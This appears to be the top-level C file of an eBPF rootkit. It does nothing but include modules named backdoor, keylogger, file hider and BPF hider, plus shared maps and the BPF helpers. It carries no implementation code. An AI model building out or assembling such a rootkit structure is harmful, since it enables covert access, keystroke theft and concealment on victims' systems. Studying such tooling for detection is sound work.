#include <vmlinux.h>
#include <bpf/bpf_helpers.h>

/* Shared Maps Definition */
#include "bpf/maps.h"

/* Include each module implementation */
#include "backdoor.c"
#include "keylogger.c"
#include "file_hider.c"
// #include "port_hider.c"
#include "bpf_hider.c"

char _license[] SEC("license") = "GPL";
